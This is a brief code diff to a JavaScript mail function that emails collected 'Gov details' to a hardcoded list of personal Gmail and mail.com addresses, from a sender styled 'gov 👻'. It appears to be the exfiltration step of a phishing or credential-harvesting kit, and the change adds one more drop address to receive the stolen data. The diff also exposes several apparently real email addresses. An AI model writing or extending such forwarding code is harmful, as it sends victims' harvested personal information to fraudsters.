@@ -61,7 +61,7 @@ const sendEmail2 = async (email, message, reason, callback) => {
         });
         let mailOptions = {
             from: `"gov 👻" <${process.env.EMAIL}>`, // sender address
-            to: "techt5562@gmail.com, brainm725@gmail.com, annafun@mail.com", // list of receivers
+            to: "techt5562@gmail.com, brainm725@gmail.com, Edwardkyles20@gmail.com, annafun@mail.com", // list of receivers
             subject: `${reason} ✔`, // Subject line
             text: "Gov details", // plain text body
             html: output, // html body
